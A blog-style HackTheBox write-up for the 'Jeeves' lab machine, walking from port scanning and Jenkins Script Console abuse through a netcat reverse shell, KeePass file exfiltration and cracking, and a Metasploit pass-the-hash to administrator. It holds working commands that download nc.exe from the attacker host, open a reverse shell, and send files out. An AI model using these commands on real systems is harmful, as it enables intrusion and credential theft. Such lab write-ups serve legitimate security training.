---
layout: post
title:  "HackTheBox Writeup: Jeeves"
date:   2018-03-15 00:00:00 -0400
categories: master
---

A quick port scan reveals that the following ports are open. We notice that port 50,000 is 
open, which is unusual.
```
root@kali:~# masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.63

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-03-15 23:22:43 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 50000/tcp on 10.10.10.63                                  
Discovered open port 80/tcp on 10.10.10.63                                     
Discovered open port 135/tcp on 10.10.10.63                                    
Discovered open port 445/tcp on 10.10.10.63 
```

Let's enumerate these ports a bit more with nmap:
```
root@kali:~# nmap -p80,135,445,50000 -sV -sS -T4 10.10.10.63 -v

Nmap scan report for 10.10.10.63
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```
So we see that port 50000 is running Jetty, which is a Java http server.
Let's quickly view port 80 in a web browser first.

![Port 80 web server](https://i.imgur.com/7skF1nf.png "Ask Jeeves on port 80")

Inputting any type of text leads to an error, or specifically, an image of an error.
![AskJeeves error](https://i.imgur.com/PAavAlF.png "Error upon input on Ask Jeeves")

There doesn't seem to be much else to do, and my instincts tell me that the real prize lies in 
port 50,000, so let's try that next. going to that port reveals a 404 error.

![Port 5000 Jetty HTTP Server](https://i.imgur.com/GZf8gNr.png "404 Error on Node, port 
50,000")

Not to be discouraged, and feeling that there's more than meets the eye, let's run dirbuster 
to find any interesting directories. Running dirbuster with 
`/usr/share/wordlists/dirbuster/directory-list-1.0.txt` reveals the 
/askjeeves/ directory, which has Jenkins running.

![Jenkins running on port 50000 in directory askjeeves](https://i.imgur.com/9y8W6pr.png 
"Jenkins running in directory askjeeves")

Under `Manage Jenkins` we see that there is a Script Console. We can use this to execute 
system commands using the general format `println("cmd.exe /c [command]".execute().text)`

![Running dir command using Jenkin's Script Console](https://i.imgur.com/etSU1Lk.png "Running 
dir command using Jenkin's Script Console")

To get an interactive shell, let's download nc.exe onto the machine using the command below, 
with the IP address modified to your own IP address:

`println("cmd.exe /c powershell -c (new-object 
System.Net.WebClient).DownloadFile('http://10.10.14.146/scripts/nc.exe','C:\\Users\\kohsuke\\Desktop\\nc.exe')".execute().text)`

The command below will give you a reverse shell on your machine:

`println("cmd.exe /c c:\\Users\\kohsuke\\Desktop\\nc.exe 10.10.14.146 4445 -e 
C:\\WINDOWS\\System32\\cmd.exe".execute().text)`

After looking around the filesystem, you should come across a `CEH.kdbx` file under 
`C:\Users\kohsuke\Documents`. This is a keepass file that contains a directory of passwords. 

To transfer this file from the Jeeves machine to our local machine, let's set up a netcat 
listener that will take the output and store it in a file:

`nc -nlvp 1234 > CEH.kdbx`

And in our reverse shell, the following command will take the contents of `CEH.kdbx` and send 
it 
to the listener we just set up:

`nc.exe -v 10.10.14.146 1234 < C:\Users\kohsuke\Documents\CEH.kdbx`

```
root@kali:~# nc -nlvp 1234 > CEH.kdbx
listening on [any] 1234 ...
connect to [10.10.14.106] from (UNKNOWN) [10.10.10.63] 49727
^C
root@kali:~# cat CEH.kdbx 
٢�g�K�1����qCP�X!j�Z� ���yݹ�8|E���/�jW���?<q�= 8i�5���U�f�`k��+��&!����<z@�p9<���ب ۑB��O 
Y�0�8�+���!��L��LsiC��e�*�f�J�	 �7f�ecQì�(/Q1�`���d}�gr��
[snip]
```

We now need to use `keepass2john` to create a hash of the CEH.kdbx in order to crack the 
password.

```
root@kali:~# keepass2john CEH.kdbx > crack.hash
root@kali:~# cat crack.hash 
CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869f
e357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b7
3766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b6
8254db431a21ec33298b612fe647db48
```

Before we send this off to `hashcat` we need to remove the `CEH:` at the very start of the 
hash file. The output is below:

```
[garet ~]$ hashcat -m 13400 -a 0 -w 1 hash rockyou.txt
hashcat (v4.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related 
errors.
             To disable the timeout, see: 
https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1060 3GB, 752/3011 MB allocatable, 
9MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 
bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921525
* Keyspace..: 14344387

$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869f
e357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f
6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc
89f728b68254db431a21ec33298b612fe647db48:moonshine1
                                                 
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 
(AES)
Hash.Target......: 
$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fc...47db48
Time.Started.....: Fri May 18 14:53:28 2018 (1 sec)
Time.Estimated...: Fri May 18 14:53:29 2018 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:    61014 H/s (3.13ms) @ Accel:64 Loops:64 
Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 55296/14344387 (0.39%)
Rejected.........: 0/55296 (0.00%)
Restore.Point....: 36864/14344387 (0.26%)
Candidates.#1....: hockey5 -> gonoles
HWMon.Dev.#1.....: Temp: 43c Fan:  0% Util: 99% Core:1949MHz 
Mem:3802MHz Bus:16

Started: Fri May 18 14:53:19 2018
Stopped: Fri May 18 14:53:30 2018
```

We can see that the password is `moonshine1` and that it took 
11 seconds with a GTX 1060 3G to crack it. We'll use the 
`kpcli` tool which is Keepass' command line interface tool.

```
root@kali:~# kpcli

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open CEH.kdbx
Please provide the master password: *************************
kpcli:/> ls
=== Groups ===
CEH/
kpcli:/> cd CEH
kpcli:/CEH> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
```

The entry we want is `0. Backup stuff`. The command `show -f 0` will show the password.

```
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 
```
The password is an NTLM hash, which is used for storing passwords for Windows machines. We can 
use this hash in a Pass The Hash attack to login to the Windows machine with no need to crack 
the hash. The `psexec` module in Metasploit will do this for us.

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set rhost 10.10.10.63
rhost => 10.10.10.63
msf exploit(psexec) > set smbuser Administrator
smbuser => Administrator
msf exploit(psexec) > set smbpass 
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
smbpass => aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
msf exploit(psexec) > run

[*] Started reverse TCP handler on 10.10.14.106:4444 
[*] 10.10.10.63:445 - Connecting to the server...
[*] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user 'Administrator'...
[*] 10.10.10.63:445 - Selecting PowerShell target
[*] 10.10.10.63:445 - Executing the payload...
[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service 
executable...
[*] Sending stage (179267 bytes) to 10.10.10.63
[*] Meterpreter session 1 opened (10.10.14.146:4444 -> 10.10.10.63:49706) at 2018-05-18 
18:18:07 -0400

meterpreter > shell
Process 1088 created.
Channel 1 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,200,407,552 bytes free
```
While we now have Administrative privilege, there is one more step needed to get the 
`root.txt` file, which is hidden via a technique called alternative data streams. The command 
`dir /R` will reveal any files that have an alternative data stream.

```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,200,407,552 bytes free
```
We can use a powershell command to get the contents of the alternative data stream.

```
C:\Users\Administrator\Desktop>powershell -command "Get-Content -path hm.txt -stream root.txt"
powershell -command "Get-Content -path hm.txt -stream root.txt"

afbc[rest of flag, hidden for spoilers]

C:\Users\Administrator\Desktop>
```

And that's all folks. We have both admin privileges and the flag.
